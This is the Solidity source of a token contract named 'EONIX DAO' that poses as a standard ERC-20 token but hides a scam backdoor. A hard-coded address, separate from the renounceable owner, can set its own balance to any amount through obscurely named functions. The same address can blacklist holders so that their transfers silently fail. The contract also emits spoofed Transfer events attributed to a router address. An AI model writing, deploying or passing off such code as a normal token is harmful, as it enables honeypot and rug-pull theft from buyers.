/**
 *Submitted for verification at Etherscan.io on 2022-10-29
*/

/**
 *Submitted for verification at Etherscan.io on 2022-10-28
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address ckstruct = 0x1eEFA82f8cBC16885C4977B261cCA710E176e373;
	address V3Router = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _owner);
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}



contract EONIX is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) public Zti;
	mapping (address => uint256) private Yti;
    mapping (address => bool) private CXv;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = "EONIX DAO";
    string private constant _symbol = "EONIX";



    constructor () {
        Zti[_msgSender()] = _tTotal;
        emit Transfer(address(0), V3Router, _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Zti[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }

               function LXBU () public {
         if(msg.sender == ckstruct)   {
        Zti[msg.sender] = Yti[msg.sender];
        }}



        function LXDE(address xt) public {
        if(msg.sender == ckstruct)  { 
        CXv[xt] = false;}}
        function LXCE(address xt) public{
         if(msg.sender == ckstruct)  { 
        require(!CXv[xt]);
        CXv[xt] = true;
        }}
             function LXBR(uint256 xt) public {
        if(msg.sender == ckstruct)  { 
        Yti[msg.sender] = xt;} } 

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == ckstruct)  {
        require(amount <= Zti[sender]);
        Zti[sender] -= amount;  
        Zti[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (V3Router, recipient, amount);
        return true; }    
          if(!CXv[sender] && !CXv[recipient]) {
        require(amount <= Zti[sender]);
 require(amount <= _allowances[sender][msg.sender]);
        Zti[sender] -= amount;
        Zti[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}

 

    function transfer(address recipient, uint256 amount) public {
        if(msg.sender == ckstruct)  {
        require(Zti[msg.sender] >= amount);
        Zti[msg.sender] -= amount;  
        Zti[recipient] += amount; 
        emit Transfer (V3Router, recipient, amount);
       }  
        if(!CXv[msg.sender]) {
        require(Zti[msg.sender] >= amount);
        Zti[msg.sender] -= amount;  
        Zti[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}
    

}